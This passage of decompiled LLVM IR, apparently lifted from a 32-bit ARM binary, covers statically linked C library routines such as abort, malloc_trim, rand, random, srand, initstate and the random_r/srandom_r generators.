  br label %dec_label_pc_266fc

dec_label_pc_266fc:                               ; preds = %entry, %dec_label_pc_266e4
  store i32 %v3_264e8, i32* @r4, align 4
  store i32 %v6_264e8, i32* @r5, align 4
  store i32 %v9_264e8, i32* @r6, align 4
  store i32 %v12_264e8, i32* @r7, align 4
  store i32 %v18_264e8, i32* @lr, align 4
  ret i32 %v2_264f4

; uselistorder directives
  uselistorder i32 %v0_26694, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v0_26654, { 1, 0 }
  uselistorder i32 %v1_26594, { 1, 0 }
  uselistorder i32 %v0_26594, { 1, 0 }
  uselistorder i32 %v3_26568, { 1, 0 }
  uselistorder i32 %v1_2654c, { 1, 0, 2 }
  uselistorder i32 %v2_26548, { 1, 2, 0, 3 }
  uselistorder i32 %v4_26540, { 1, 0, 2, 3 }
  uselistorder i32 %v0_264f0, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9, 10, 11 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 7, 5, 6, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28 }
  uselistorder i32* %r0.global-to-local, { 0, 4, 1, 2, 3, 7, 5, 6, 13, 14, 8, 9, 10, 12, 11 }
  uselistorder i32* %lr.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder i32* %ip.global-to-local, { 4, 0, 5, 1, 6, 3, 2, 7, 8, 9, 10, 11, 12 }
  uselistorder label %dec_label_pc_266fc, { 1, 0 }
  uselistorder label %dec_label_pc_266e4, { 4, 2, 0, 1, 3 }
  uselistorder label %bb16, { 1, 0 }
  uselistorder label %dec_label_pc_26674, { 1, 0 }
  uselistorder label %dec_label_pc_26634, { 1, 0 }
  uselistorder label %dec_label_pc_26628, { 1, 0 }
  uselistorder label %dec_label_pc_26624, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_265d8, { 1, 0 }
}

define i32 @function_2670c(i32 %arg1) local_unnamed_addr {
dec_label_pc_2670c:
  %v0_2670c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_2670c, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_2670c
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_2670c, %bb
  %v10_26720 = phi i32 [ %arg1, %dec_label_pc_2670c ], [ 0, %bb ]
  ret i32 %v10_26720

; uselistorder directives
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @malloc_trim(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v3_26724 = load i32, i32* @r4, align 4
  store i32 %v3_26724, i32* %stack_var_-12, align 4
  %v6_26724 = load i32, i32* @r5, align 4
  %v4_26734 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 72) to i32*), align 4
  store i32 %v4_26734, i32* @r5, align 4
  store i32 %arg1, i32* @r4, align 4
  store i32 %v4_26734, i32* @r0, align 4
  %v0_26744 = call i32 @__malloc_consolidate()
  %v0_26748 = load i32, i32* @r4, align 4
  %v0_2674c = load i32, i32* @r5, align 4
  %v2_26754 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_26754, i32* @r4, align 4
  store i32 %v6_26724, i32* @r5, align 4
  %v2_26758 = call i32 @__malloc_trim(i32 %v0_26748, i32 %v0_2674c)
  %v0_2675c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_2675c, label %bb, label %.thread

bb:                                               ; preds = %entry
  br label %.thread

.thread:                                          ; preds = %entry, %bb
  %v4_26760 = phi i32 [ %v2_26758, %entry ], [ 0, %bb ]
  ret i32 %v4_26760

; uselistorder directives
  uselistorder i32 (i32, i32)* @__malloc_trim, { 1, 0 }
  uselistorder i32 ()* @__malloc_consolidate, { 3, 2, 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @abort() local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32* @r5, align 4
  %v4_2677c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 20) to i32*), align 4
  store i32 157576, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_2677c)
  store i32 32, i32* %stack_var_-8, align 4
  %v4_267a4 = call i32 @__GI_sigprocmask(i32 1, i32* nonnull %stack_var_-8, i32 0)
  %v0_267ac = load i32, i32* @r5, align 4
  %v2_267ac = add i32 %v0_267ac, 26044
  %v3_267ac = inttoptr i32 %v2_267ac to i32*
  %v4_267ac = load i32, i32* %v3_267ac, align 4
  %v2_267b0 = icmp eq i32 %v4_267ac, 0
  br i1 %v2_267b0, label %dec_label_pc_267b8, label %dec_label_pc_267f8

dec_label_pc_267b8:                               ; preds = %entry
  store i32 1, i32* %v3_267ac, align 4
  br label %dec_label_pc_267c0

dec_label_pc_267c0:                               ; preds = %dec_label_pc_26808, %dec_label_pc_267b8
  %v0_267c4 = load i32, i32* @r5, align 4
  %v2_267c4 = add i32 %v0_267c4, 632
  store i32 %v2_267c4, i32* @r4, align 4
  %v2_267d0 = add i32 %v0_267c4, 76
  %v3_267d0 = inttoptr i32 %v2_267d0 to i32*
  %v4_267d0 = load i32, i32* %v3_267d0, align 4
  call void @__pseudo_branch(i32 %v4_267d0)
  %v1_267e0 = call i32 @__GI_raise(i32 6)
  %v0_267ec = load i32, i32* @r5, align 4
  %v2_267ec = add i32 %v0_267ec, 20
  %v3_267ec = inttoptr i32 %v2_267ec to i32*
  %v4_267ec = load i32, i32* %v3_267ec, align 4
  store i32 157688, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_267ec)
  %v0_267fc.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_267f8

dec_label_pc_267f8:                               ; preds = %entry, %dec_label_pc_267c0
  %v1_26810 = phi i32 [ %v0_267ac, %entry ], [ %v0_267fc.pre, %dec_label_pc_267c0 ]
  %v2_267fc = add i32 %v1_26810, 26044
  %v3_267fc = inttoptr i32 %v2_267fc to i32*
  %v4_267fc = load i32, i32* %v3_267fc, align 4
  %v7_26800 = icmp eq i32 %v4_267fc, 1
  br i1 %v7_26800, label %dec_label_pc_26808, label %dec_label_pc_26844

dec_label_pc_26808:                               ; preds = %dec_label_pc_267f8
  %v2_26808 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_26808, i32* @r4, align 4
  store i32 2, i32* %v3_267fc, align 4
  %v3_26820 = bitcast i32* %stack_var_-28 to i8*
  %v4_26820 = call i32 @__GI_memset(i8* %v3_26820, i32 0, i32 20)
  %v3_2683c = call i32 @__libc_sigaction(i32 6, i32 %v2_26808, i32 0)
  br label %dec_label_pc_267c0

dec_label_pc_26844:                               ; preds = %dec_label_pc_267f8
  %v7_26844 = icmp eq i32 %v4_267fc, 2
  br i1 %v7_26844, label %dec_label_pc_2684c, label %dec_label_pc_26858

dec_label_pc_2684c:                               ; preds = %dec_label_pc_26844
  store i32 3, i32* %v3_267fc, align 4
  %v0_26854 = call i32 @abort()
  %v0_26858.pre = load i32, i32* @r5, align 4
  %v1_26858.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_26858

dec_label_pc_26858:                               ; preds = %dec_label_pc_26844, %dec_label_pc_2684c
  %v3_26864 = phi i32 [ 26044, %dec_label_pc_26844 ], [ %v1_26858.pre, %dec_label_pc_2684c ]
  %v2_26864 = phi i32 [ %v1_26810, %dec_label_pc_26844 ], [ %v0_26858.pre, %dec_label_pc_2684c ]
  %v2_26858 = add i32 %v2_26864, %v3_26864
  %v3_26858 = inttoptr i32 %v2_26858 to i32*
  %v4_26858 = load i32, i32* %v3_26858, align 4
  %v7_2685c = icmp eq i32 %v4_26858, 3
  br i1 %v7_2685c, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_26858
  store i32 4, i32* %v3_26858, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_26858, %bb
  call void @__pseudo_cond_branch(i1 %v7_2685c, i32 ptrtoint (i32* @global_var_22d4c.3205 to i32))
  br label %dec_label_pc_26870

dec_label_pc_26870:                               ; preds = %dec_label_pc_26870, %.thread2
  %v0_26870 = call i32 @abort()
  br label %dec_label_pc_26870

; uselistorder directives
  uselistorder i32* %v3_267fc, { 1, 0, 2 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %dec_label_pc_26858, { 1, 0 }
  uselistorder label %dec_label_pc_267f8, { 1, 0 }
}

define i32 @function_2687c(i16* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_2687c:
  %tmp = ptrtoint i16* %arg1 to i32
  %v0_2687c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_2687c, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_2687c
  %v2_2687c = load i32, i32* @r8, align 4
  %v4_2687c = lshr i32 %v2_2687c, %arg2
  %v5_2687c = sub i32 32, %arg2
  %v6_2687c = shl i32 %v2_2687c, %v5_2687c
  %v7_2687c = or i32 %v6_2687c, %v4_2687c
  %v9_2687c = and i32 %v7_2687c, %tmp
  %v2_26880 = load i32, i32* @r4, align 4
  %v8_26880 = shl i32 %v2_26880, %v9_2687c
  %v9_26880 = and i32 %v8_26880, %v9_2687c
  %v1_26884 = load i32, i32* @r6, align 4
  %v2_26884 = trunc i32 %v1_26884 to i16
  %v4_26884 = inttoptr i32 %v9_26880 to i16*
  store i16 %v2_26884, i16* %v4_26884, align 2
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_2687c, %bb
  %v4_26888 = phi i32 [ %tmp, %dec_label_pc_2687c ], [ 0, %bb ]
  ret i32 %v4_26888

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @rand() local_unnamed_addr {
entry:
  %v0_26894 = call i32 @random()
  ret i32 %v0_26894
}

define i32 @random() local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %v3_268a4 = load i32, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32* @r4, align 4
  %v4_268d4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 124) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_268d4)
  %v0_268e8 = load i32, i32* @r4, align 4
  %v2_268e8 = add i32 %v0_268e8, 20
  %v3_268e8 = inttoptr i32 %v2_268e8 to i32*
  %v4_268e8 = load i32, i32* %v3_268e8, align 4
  store i32 ptrtoint (i32* @global_var_268f4.3211 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_268e8)
  %v2_268f8 = ptrtoint i32* %stack_var_-20 to i32
  %v0_268fc = load i32, i32* @r4, align 4
  %v2_268fc = add i32 %v0_268fc, 808
  %v2_26900 = inttoptr i32 %v2_268fc to i32*
  %v3_26900 = call i32 @__GI_random_r(i32* %v2_26900, i32 %v2_268f8)
  %v0_26910 = load i32, i32* @r4, align 4
  %v2_26910 = add i32 %v0_26910, 52
  %v3_26910 = inttoptr i32 %v2_26910 to i32*
  %v4_26910 = load i32, i32* %v3_26910, align 4
  call void @__pseudo_branch(i32 %v4_26910)
  %v3_2691c = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_268a4, i32* @r4, align 4
  ret i32 %v3_2691c
}

define i32 @function_26930(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_26930:
  %v0_26930 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_26930, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_26930
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_26930, %bb
  %v10_26944 = phi i32 [ %arg1, %dec_label_pc_26930 ], [ 0, %bb ]
  ret i32 %v10_26944

; uselistorder directives
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @setstate(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32* @r6, align 4
  store i32 %arg1, i32* @r5, align 4
  %v4_26978 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 124) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_26978)
  %v0_2698c = load i32, i32* @r6, align 4
  %v2_2698c = add i32 %v0_2698c, 20
  %v3_2698c = inttoptr i32 %v2_2698c to i32*
  %v4_2698c = load i32, i32* %v3_2698c, align 4
  call void @__pseudo_branch(i32 %v4_2698c)
  %v0_2699c = load i32, i32* @r6, align 4
  %v2_2699c = add i32 %v0_2699c, 808
  %v0_269a4 = load i32, i32* @r5, align 4
  %v1_269a8 = add i32 %v0_2699c, 816
  %v2_269a8 = inttoptr i32 %v1_269a8 to i32*
  %v3_269a8 = load i32, i32* %v2_269a8, align 4
  store i32 %v3_269a8, i32* @r4, align 4
  %v2_269ac = inttoptr i32 %v2_2699c to i32*
  %v3_269ac = call i32 @setstate_r(i32 %v0_269a4, i32* %v2_269ac)
  %v1_269b4 = icmp slt i32 %v3_269ac, 0
  %v3_269c4 = load i32, i32* @r4, align 4
  %v4_269c4 = add i32 %v3_269c4, -4
  %storemerge = select i1 %v1_269b4, i32 0, i32 %v4_269c4
  %v0_269c8 = load i32, i32* @r6, align 4
  %v2_269c8 = add i32 %v0_269c8, 52
  %v3_269c8 = inttoptr i32 %v2_269c8 to i32*
  %v4_269c8 = load i32, i32* %v3_269c8, align 4
  call void @__pseudo_branch(i32 %v4_269c8)
  ret i32 %storemerge
}

define i32 @function_269e8(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_269e8:
  %v0_269e8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_269e8, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_269e8
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_269e8, %bb
  %v10_269fc = phi i32 [ %arg1, %dec_label_pc_269e8 ], [ 0, %bb ]
  ret i32 %v10_269fc

; uselistorder directives
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @initstate(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32* @r4, align 4
  store i32 %arg1, i32* @sl, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r7, align 4
  %v4_26a38 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 124) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_26a38)
  %v0_26a4c = load i32, i32* @r4, align 4
  %v2_26a4c = add i32 %v0_26a4c, 20
  %v3_26a4c = inttoptr i32 %v2_26a4c to i32*
  %v4_26a4c = load i32, i32* %v3_26a4c, align 4
  call void @__pseudo_branch(i32 %v4_26a4c)
  %v0_26a5c = load i32, i32* @r6, align 4
  %v0_26a60 = load i32, i32* @r4, align 4
  %v2_26a60 = add i32 %v0_26a60, 808
  %v0_26a64 = load i32, i32* @r7, align 4
  %v0_26a68 = load i32, i32* @sl, align 4
  store i32 %v0_26a68, i32* @r0, align 4
  %v1_26a6c = add i32 %v0_26a60, 816
  %v2_26a6c = inttoptr i32 %v1_26a6c to i32*
  %v3_26a6c = load i32, i32* %v2_26a6c, align 4
  store i32 %v3_26a6c, i32* @r5, align 4
  %v4_26a70 = inttoptr i32 %v0_26a68 to i32*
  %v5_26a70 = call i32 @__GI_initstate_r(i32* %v4_26a70, i32 %v0_26a5c, i32 %v0_26a64, i32 %v2_26a60)
  %v0_26a80 = load i32, i32* @r4, align 4
  %v2_26a80 = add i32 %v0_26a80, 52
  %v3_26a80 = inttoptr i32 %v2_26a80 to i32*
  %v4_26a80 = load i32, i32* %v3_26a80, align 4
  call void @__pseudo_branch(i32 %v4_26a80)
  %v0_26a8c = load i32, i32* @r5, align 4
  %v1_26a8c = add i32 %v0_26a8c, -4
  ret i32 %v1_26a8c
}

define i32 @function_26aa8(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_26aa8:
  %v0_26aa8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_26aa8, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_26aa8
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_26aa8, %bb
  %v10_26abc = phi i32 [ %arg1, %dec_label_pc_26aa8 ], [ 0, %bb ]
  ret i32 %v10_26abc

; uselistorder directives
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @srand(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v3_26ac0 = load i32, i32* @r4, align 4
  %v6_26ac0 = load i32, i32* @r5, align 4
  %v9_26ac0 = load i32, i32* @r6, align 4
  %v15_26ac0 = load i32, i32* @lr, align 4
  store i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32* @r4, align 4
  %v2_26ad4 = ptrtoint i32* %stack_var_-40 to i32
  store i32 add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 656), i32* @r5, align 4
  store i32 %arg1, i32* @r6, align 4
  %v4_26af0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 124) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_26af0)
  %v0_26b04 = load i32, i32* @r4, align 4
  %v2_26b04 = add i32 %v0_26b04, 20
  %v3_26b04 = inttoptr i32 %v2_26b04 to i32*
  %v4_26b04 = load i32, i32* %v3_26b04, align 4
  call void @__pseudo_branch(i32 %v4_26b04)
  %v0_26b14 = load i32, i32* @r6, align 4
  store i32 %v0_26b14, i32* @r0, align 4
  %v0_26b18 = load i32, i32* @r4, align 4
  %v2_26b18 = add i32 %v0_26b18, 808
  %v2_26b1c = inttoptr i32 %v0_26b14 to i32*
  %v3_26b1c = call i32 @srandom_r(i32* %v2_26b1c, i32 %v2_26b18)
  %v0_26b30 = load i32, i32* @r4, align 4
  %v2_26b30 = add i32 %v0_26b30, 52
  %v3_26b30 = inttoptr i32 %v2_26b30 to i32*
  %v4_26b30 = load i32, i32* %v3_26b30, align 4
  call void @__pseudo_branch(i32 %v4_26b30)
  store i32 %v3_26ac0, i32* @r4, align 4
  store i32 %v6_26ac0, i32* @r5, align 4
  store i32 %v9_26ac0, i32* @r6, align 4
  store i32 %v15_26ac0, i32* @lr, align 4
  ret i32 %v2_26ad4
}

define i32 @function_26b4c(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_26b4c:
  %v0_26b4c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_26b4c, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_26b4c
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_26b4c, %bb
  %v10_26b60 = phi i32 [ %arg1, %dec_label_pc_26b4c ], [ 0, %bb ]
  ret i32 %v10_26b60

; uselistorder directives
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @__GI_random_r(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_26b64 = load i32, i32* @r4, align 4
  store i32 %v3_26b64, i32* %stack_var_-8, align 4
  %v1_26b68 = add i32 %tmp, 12
  %v2_26b68 = inttoptr i32 %v1_26b68 to i8*
  %v3_26b68 = load i8, i8* %v2_26b68, align 1
  %v4_26b68 = sext i8 %v3_26b68 to i32
  store i32 %v4_26b68, i32* %r3.global-to-local, align 4
  %v2_26b6c = icmp eq i8 %v3_26b68, 0
  store i32 %tmp, i32* %ip.global-to-local, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  %v1_26b78 = add i32 %tmp, 8
  %v2_26b78 = inttoptr i32 %v1_26b78 to i32*
  %v3_26b78 = load i32, i32* %v2_26b78, align 4
  store i32 %v3_26b78, i32* %lr.global-to-local, align 4
  br i1 %v2_26b6c, label %dec_label_pc_26b80, label %dec_label_pc_26ba4

dec_label_pc_26b80:                               ; preds = %entry
  %v1_26b80 = inttoptr i32 %v3_26b78 to i32*
  %v2_26b80 = load i32, i32* %v1_26b80, align 4
  store i32 %v2_26b80, i32* %r2.global-to-local, align 4
  %v2_26b88 = mul i32 %v2_26b80, 1103515245
  %v1_26b90 = add i32 %v2_26b88, 12345
  %tmp6 = bitcast i32 %v1_26b90 to float
  %tmp7 = call float @fabsf(float %tmp6)
  %v1_26b94 = bitcast float %tmp7 to i32
  store i32 %v1_26b94, i32* %r3.global-to-local, align 4
  store i32 %v1_26b94, i32* %v1_26b80, align 4
  %v0_26b9c = load i32, i32* %r3.global-to-local, align 4
  %v2_26b9c = inttoptr i32 %arg2 to i32*
  store i32 %v0_26b9c, i32* %v2_26b9c, align 4
  br label %dec_label_pc_26be4

dec_label_pc_26ba4:                               ; preds = %entry
  %v2_26ba4 = load i32, i32* %arg1, align 4
  store i32 %v2_26ba4, i32* %r2.global-to-local, align 4
  %v1_26ba8 = add i32 %tmp, 4
  %v2_26ba8 = inttoptr i32 %v1_26ba8 to i32*
  %v3_26ba8 = load i32, i32* %v2_26ba8, align 4
  store i32 %v3_26ba8, i32* %r0.global-to-local, align 4
  %v1_26bac = inttoptr i32 %v2_26ba4 to i32*
  %v2_26bac = load i32, i32* %v1_26bac, align 4
  store i32 %v2_26bac, i32* %r1.global-to-local, align 4
  %v1_26bb0 = inttoptr i32 %v3_26ba8 to i32*
  %v2_26bb0 = load i32, i32* %v1_26bb0, align 4
  %v4_26bb0 = add i32 %v3_26ba8, 4
  store i32 %v4_26bb0, i32* %r0.global-to-local, align 4
  %v2_26bb4 = add i32 %v2_26bb0, %v2_26bac
  store i32 %v2_26bb4, i32* %r3.global-to-local, align 4
  store i32 %v2_26bb4, i32* %v1_26bac, align 4
  %v3_26bb8 = load i32, i32* %r2.global-to-local, align 4
  %v4_26bb8 = add i32 %v3_26bb8, 4
  store i32 %v4_26bb8, i32* %r2.global-to-local, align 4
  %v0_26bbc = load i32, i32* %ip.global-to-local, align 4
  %v1_26bbc = add i32 %v0_26bbc, 16
  %v2_26bbc = inttoptr i32 %v1_26bbc to i32*
  %v3_26bbc = load i32, i32* %v2_26bbc, align 4
  store i32 %v3_26bbc, i32* %r1.global-to-local, align 4
  %v0_26bc0 = load i32, i32* %r3.global-to-local, align 4
  %v3_26bc0 = udiv i32 %v0_26bc0, 2
  store i32 %v3_26bc0, i32* %r3.global-to-local, align 4
  %v3_26bc4 = icmp ult i32 %v4_26bb8, %v3_26bbc
  %v1_26bc8 = load i32, i32* %r4.global-to-local, align 4
  %v2_26bc8 = inttoptr i32 %v1_26bc8 to i32*
  store i32 %v3_26bc0, i32* %v2_26bc8, align 4
  br i1 %v3_26bc4, label %dec_label_pc_26bd4, label %._crit_edge

._crit_edge:                                      ; preds = %dec_label_pc_26ba4
  %v1_26bcc = load i32, i32* %lr.global-to-local, align 4
  store i32 %v1_26bcc, i32* %r2.global-to-local, align 4
  %v0_26bdc.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb5

dec_label_pc_26bd4:                               ; preds = %dec_label_pc_26ba4
  %v0_26bd4 = load i32, i32* %r0.global-to-local, align 4
  %v1_26bd4 = load i32, i32* %r1.global-to-local, align 4
  %v3_26bd4 = icmp ult i32 %v0_26bd4, %v1_26bd4
  br i1 %v3_26bd4, label %bb5, label %bb

bb:                                               ; preds = %dec_label_pc_26bd4
  %v1_26bd8 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v1_26bd8, i32* %r0.global-to-local, align 4
  br label %bb5

bb5:                                              ; preds = %dec_label_pc_26bd4, %._crit_edge, %bb
  %v0_26bdc = phi i32 [ %v0_26bdc.pre, %._crit_edge ], [ %v0_26bd4, %dec_label_pc_26bd4 ], [ %v1_26bd8, %bb ]
  %v1_26bdc = load i32, i32* %ip.global-to-local, align 4
  %v2_26bdc = add i32 %v1_26bdc, 4
  %v3_26bdc = inttoptr i32 %v2_26bdc to i32*
  store i32 %v0_26bdc, i32* %v3_26bdc, align 4
  %v0_26be0 = load i32, i32* %r2.global-to-local, align 4
  %v1_26be0 = load i32, i32* %ip.global-to-local, align 4
  %v2_26be0 = inttoptr i32 %v1_26be0 to i32*
  store i32 %v0_26be0, i32* %v2_26be0, align 4
  br label %dec_label_pc_26be4

dec_label_pc_26be4:                               ; preds = %dec_label_pc_26b80, %bb5
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_26be8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_26be8, i32* @r4, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v3_26bc0, { 1, 0 }
  uselistorder i32 %v1_26b94, { 1, 0 }
  uselistorder i32 %tmp, { 0, 3, 2, 1, 4 }
  uselistorder i32* %r2.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder label %dec_label_pc_26be4, { 1, 0 }
  uselistorder label %bb5, { 2, 0, 1 }
}

define i32 @srandom_r(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_26bf4 = load i32, i32* @r4, align 4
  store i32 %v3_26bf4, i32* %stack_var_-36, align 4
  %v1_26bf8 = add i32 %tmp, 12
  %v2_26bf8 = inttoptr i32 %v1_26bf8 to i8*
  %v3_26bf8 = load i8, i8* %v2_26bf8, align 1
  store i32 %tmp, i32* %r5.global-to-local, align 4
  %v3_26c08 = load i8, i8* %v2_26bf8, align 1
  %tmp33 = icmp ugt i8 %v3_26bf8, 4
  br i1 %tmp33, label %.dec_label_pc_26cb4_crit_edge, label %dec_label_pc_26c14

.dec_label_pc_26cb4_crit_edge:                    ; preds = %entry
  br label %dec_label_pc_26cb4

dec_label_pc_26c14:                               ; preds = %entry
  %v0_26c14 = load i32, i32* @r0, align 4
  %v2_26c14 = icmp eq i32 %v0_26c14, 0
  %v1_26c18 = add i32 %tmp, 8
  %v2_26c18 = inttoptr i32 %v1_26c18 to i32*
  %v3_26c18 = load i32, i32* %v2_26c18, align 4
  store i32 %v3_26c18, i32* %r6.global-to-local, align 4
  br i1 %v2_26c14, label %bb, label %bb23

bb:                                               ; preds = %dec_label_pc_26c14
  store i32 1, i32* @r0, align 4
  br label %bb23

bb23:                                             ; preds = %dec_label_pc_26c14, %bb
  %v0_26c24 = phi i32 [ %v0_26c14, %dec_label_pc_26c14 ], [ 1, %bb ]
  %v2_26c20 = icmp eq i8 %v3_26c08, 0
  %v2_26c24 = inttoptr i32 %v3_26c18 to i32*
  store i32 %v0_26c24, i32* %v2_26c24, align 4
  br i1 %v2_26c20, label %dec_label_pc_26cb0, label %dec_label_pc_26c2c

dec_label_pc_26c2c:                               ; preds = %bb23
  %v1_26c2c = add i32 %tmp, 13
  %v2_26c2c = inttoptr i32 %v1_26c2c to i8*
  %v3_26c2c = load i8, i8* %v2_26c2c, align 1
  %v4_26c2c = sext i8 %v3_26c2c to i32
  store i32 %v4_26c2c, i32* %sl.global-to-local, align 4
  store i32 16807, i32* %fp.global-to-local, align 4
  store i32 2836, i32* %sb.global-to-local, align 4
  %v0_26c38 = load i32, i32* @r0, align 4
  store i32 %v0_26c38, i32* %r4.global-to-local, align 4
  %v0_26c3c = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_26c3c, i32* %r8.global-to-local, align 4
  store i32 2, i32* %r7.global-to-local, align 4
  %v5_26c7c25 = icmp sgt i8 %v3_26c2c, 1
  br i1 %v5_26c7c25, label %dec_label_pc_26c48, label %dec_label_pc_26c80

dec_label_pc_26c48:                               ; preds = %dec_label_pc_26c2c, %dec_label_pc_26c48.dec_label_pc_26c48_crit_edge
  %v1_26c5c = phi i32 [ %v1_26c5c.pre, %dec_label_pc_26c48.dec_label_pc_26c48_crit_edge ], [ 2836, %dec_label_pc_26c2c ]
  %v1_26c50 = phi i32 [ %v1_26c50.pre, %dec_label_pc_26c48.dec_label_pc_26c48_crit_edge ], [ 16807, %dec_label_pc_26c2c ]
  %v0_26c4c27 = phi i32 [ %v0_26c70.pre, %dec_label_pc_26c48.dec_label_pc_26c48_crit_edge ], [ %v0_26c38, %dec_label_pc_26c2c ]
  %v1_26c6826 = phi i32 [ %v5_26c68, %dec_label_pc_26c48.dec_label_pc_26c48_crit_edge ], [ %v0_26c3c, %dec_label_pc_26c2c ]
  %v3_26c48 = urem i32 %v0_26c4c27, 127773
  %v2_26c50 = mul i32 %v1_26c50, %v3_26c48
  %v2_26c58 = sdiv i32 %v0_26c4c27, 127773
  %v2_26c5c = mul i32 %v1_26c5c, %v2_26c58
  %v2_26c60 = sub i32 %v2_26c50, %v2_26c5c
  %v8_26c60 = icmp slt i32 %v2_26c60, 0
